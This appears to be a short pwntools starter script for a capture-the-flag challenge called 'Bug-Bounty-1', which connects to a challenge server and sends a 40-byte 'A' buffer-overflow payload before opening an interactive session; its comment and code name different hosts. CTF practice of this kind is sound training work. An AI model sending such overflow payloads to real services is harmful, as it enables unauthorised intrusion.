# Bug-Bounty-1 — Pwny-CTF (script de solve)
from pwn import *

# Connect to the instance - `nc chal.fallctf.com 5002`
conn = remote("chal.sigpwny.com", 1343)
# Use process() if you want to test locally
# conn = process('./challenge')

# Receive the prompt
conn.recvuntil(b"> ")

# Write your exploit here!
exploit = b"A" * 40

# Send the payload
conn.sendline(exploit)

# Drop to an interactive shell to interact with the process
conn.interactive()
